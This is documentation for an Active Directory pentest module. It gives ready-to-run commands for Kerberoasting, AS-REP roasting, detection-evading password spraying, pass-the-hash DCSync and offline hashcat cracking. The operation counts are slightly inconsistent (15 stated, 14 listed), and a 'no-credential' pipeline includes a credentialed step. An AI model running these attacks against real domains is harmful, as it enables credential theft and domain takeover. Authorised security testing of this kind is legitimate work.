Overview

What adsec does

adsec is the Active Directory penetration testing module inside SecV. It provides a complete Linux-side attack workflow against Windows AD environments — from unauthenticated domain controller discovery through authenticated enumeration, credential attacks, and post-authentication data collection.

The module wraps impacket, ldap3, netexec, and bloodhound-python into a unified interface. Every operation reads JSON from stdin and writes structured JSON to stdout, making it composable with other secV modules and standard tooling. Two built-in auto pipelines chain operations together for both unauthenticated and authenticated engagements.

Supported environments: Arch Linux, Kali Linux, BlackArch, and Debian-based distributions. All dependency checks run at module startup — missing tools are reported clearly before any operation begins.

! adsec is an offensive security tool. Use only on systems you own or have explicit written authorisation to test. Credential attacks such as password spraying carry lockout risk — read the lockout_threshold parameter documentation before running spray against production environments.

Quick Start

Running adsec

adsec reads JSON from stdin and writes JSON to stdout. The input takes a target (DC IP or domain FQDN), an operation name, and an optional params object.

# Unauthenticated DC discovery — no credentials needed
echo '{
  "target": "192.168.1.10",
  "params": { "operation": "dc_discover", "domain": "corp.local" }
}' | python3 adsec.py | jq .

# Kerberoasting — requests TGS for all SPNs, saves hashes
echo '{
  "target": "192.168.1.10",
  "params": {
    "operation": "kerberoast",
    "domain": "corp.local",
    "username": "jdoe",
    "password": "Password123",
    "output": "/tmp/kerberoast_hashes.txt"
  }
}' | python3 adsec.py

# Full unauthenticated auto pipeline
echo '{
  "target": "corp.local",
  "params": {
    "operation": "auto",
    "domain": "corp.local",
    "output": "/tmp/adsec_auto"
  }
}' | python3 adsec.py | jq .data
i The default operation is dc_discover. If no operation key is provided in params, adsec runs DC discovery automatically. All other operations require an explicit operation name.

Reference

Operations

adsec provides 15 operations across four categories. Pass the operation name as params.operation in the JSON input.

Discovery (unauthenticated)

These four operations require no credentials. They are safe to run without lockout risk and form the basis of the auto pipeline.

dc_discover default
Find domain controllers via DNS SRV record queries and LDAP probes. No credentials required. Returns DC hostnames, IPs, and site information.
smb_enum no creds
SMB share enumeration via null session. Fingerprints SMB version, signing status, and lists accessible shares. Uses netexec.
rpc_enum no creds
RPC endpoint mapping via MSRPC. Enumerates users and groups through the SAMR and LSARPC pipes without credentials where permitted.
ldap_anon no creds
Anonymous LDAP bind attempt. Discovers base DN, naming contexts, and any attributes exposed to anonymous readers.

Authenticated enumeration

These operations require valid domain credentials (username + password or NTLM hash). They perform deep enumeration of the AD environment.

ldap_enum auth
Full authenticated LDAP dump: all users, groups, GPOs, OUs, password policies, domain trusts, and ACL relationships via ldap3.
user_enum auth
Enumerate all domain user accounts. Flags disabled accounts, never-expire password flags, last logon timestamps, and accounts with no pre-auth required.
group_enum auth
Enumerate all domain groups with full nested membership resolution. Highlights AdminSDHolder-protected accounts and privileged group members.

Credential attacks

These operations target credential weaknesses in the domain. Review lockout policy before running spray.

kerberoast creds
Kerberoasting: requests TGS tickets for all accounts with registered SPNs. Saves RC4/AES hashes to output file for offline cracking with hashcat.
asreproast no creds
AS-REP roasting: finds accounts with DONT_REQUIRE_PREAUTH set and dumps their AS-REP hashes for offline cracking. No credentials required.
spray careful
Lockout-aware password spraying. Detects lockout threshold via LDAP policy query, enforces configurable delay between rounds, applies per-account jitter to avoid pattern detection.
! The spray operation reads the domain lockout policy before starting. If lockout_threshold cannot be determined automatically, it defaults to 3 attempts per account. Always verify the lockout window with the domain owner before running spray against a production environment.

Post-authentication

These operations require elevated credentials — typically a domain admin or account with DCSync rights.

secretsdump priv
DCSync via impacket secretsdump. Dumps all NTLM hashes, Kerberos keys, and domain secrets. Supports pass-the-hash with the hash parameter.
bloodhound auth
BloodHound data collection via bloodhound-python using all collection methods. Output is a ZIP archive ready for import into BloodHound CE.

Auto pipelines

Two built-in chained pipelines cover the most common engagement workflows. Both run constituent operations sequentially and aggregate their output into a single JSON result.

auto safe
Safe no-credential pipeline: dc_discover → smb_enum → ldap_anon → kerberoast → asreproast. No lockout-risk operations. Suitable for initial unauthenticated engagement phase.
auto_auth full
Authenticated full pipeline: ldap_enum → user_enum → group_enum → kerberoast → asreproast → bloodhound. Requires domain credentials. Produces complete AD picture and BloodHound ZIP.

Parameters

All parameters go inside the params object of the JSON input alongside the operation key.

Core

ParameterTypeDefaultDescription
targetstringrequiredDC IP address or domain FQDN (e.g. 192.168.1.10 or corp.local)
operationstringdc_discoverOperation name. See the Operations section for all valid values.
domainstring""Domain name in FQDN format, e.g. corp.local. Required for most operations.
usernamestring""Domain username for authenticated operations. Combine with password or hash.
passwordstring""Domain password for authenticated operations. Mutually exclusive with hash.
hashstring""NTLM hash for pass-the-hash authentication. Format: LM:NT (use 32 zeros for LM portion if unknown).
outputstring""Output file path for hash dumps (kerberoast, asreproast) or directory path for BloodHound ZIP and auto pipeline results.

Spray & Threading

ParameterTypeDefaultDescription
threadsinteger5Thread count for spray and enumeration operations. Keep low to avoid triggering rate-based detection.
delayinteger (seconds)30Delay between spray rounds in seconds. Should exceed the domain observation window for lockout counting.
lockout_thresholdinteger3Maximum authentication attempts per account before the account is skipped. adsec queries the domain policy and uses whichever is lower.

Examples

Examples

Unauthenticated DC and SMB discovery

echo '{
  "target": "10.10.10.5",
  "params": {
    "operation": "dc_discover",
    "domain": "htb.local"
  }
}' | python3 adsec.py | jq '.data.domain_controllers'

# Follow up with SMB null session enum
echo '{
  "target": "10.10.10.5",
  "params": {
    "operation": "smb_enum",
    "domain": "htb.local"
  }
}' | python3 adsec.py | jq '.data.shares'

Kerberoasting with hash output

echo '{
  "target": "192.168.100.5",
  "params": {
    "operation": "kerberoast",
    "domain": "corp.local",
    "username": "jdoe",
    "password": "Summer2024!",
    "output": "/tmp/kerb_hashes.txt"
  }
}' | python3 adsec.py

# Crack hashes offline
hashcat -m 13100 /tmp/kerb_hashes.txt /usr/share/wordlists/rockyou.txt

AS-REP roasting (no credentials)

echo '{
  "target": "dc01.corp.local",
  "params": {
    "operation": "asreproast",
    "domain": "corp.local",
    "output": "/tmp/asrep_hashes.txt"
  }
}' | python3 adsec.py | jq '.data.vulnerable_accounts'

# Crack AS-REP hashes
hashcat -m 18200 /tmp/asrep_hashes.txt /usr/share/wordlists/rockyou.txt

Pass-the-hash DCSync with secretsdump

echo '{
  "target": "192.168.1.10",
  "params": {
    "operation": "secretsdump",
    "domain": "corp.local",
    "username": "Administrator",
    "hash": "00000000000000000000000000000000:fc525c9683e8fe067095ba2ddc971889",
    "output": "/tmp/dcsync_output.txt"
  }
}' | python3 adsec.py | jq '.data.accounts | length'

Full authenticated auto pipeline with BloodHound collection

echo '{
  "target": "192.168.1.10",
  "params": {
    "operation": "auto_auth",
    "domain": "corp.local",
    "username": "pentest",
    "password": "P@ssw0rd",
    "output": "/tmp/adsec_results"
  }
}' | python3 adsec.py | jq '{
  users: .data.user_enum.count,
  groups: .data.group_enum.count,
  kerberoastable: (.data.kerberoast.hashes | length),
  asreproastable: (.data.asreproast.hashes | length),
  bloodhound_zip: .data.bloodhound.output_file
}'

Requirements

DependencyInstallUsed by
impacketpip3 install impacketsecretsdump (DCSync), Kerberos ticket requests, SMB/RPC operations
ldap3pip3 install ldap3ldap_anon, ldap_enum, user_enum, group_enum — all LDAP operations
nxc (netexec)pip3 install netexecsmb_enum, rpc_enum, spray — SMB/RPC/auth operations
bloodhound-pythonpip3 install bloodhoundbloodhound operation and auto_auth pipeline BloodHound collection
python3-dnspythonpip3 install dnspythondc_discover — DNS SRV record queries for DC location
i All five dependencies are checked at startup. If a dependency is missing, adsec reports which operations are unavailable and exits cleanly rather than failing mid-operation. Install all five for full functionality across all 15 operations.

All dependencies are available via pip3 and are present by default on Kali Linux and BlackArch. On Arch Linux and Debian, install them with pip3 inside a virtual environment or use the system package manager where packages are available (e.g. python3-impacket on Debian).
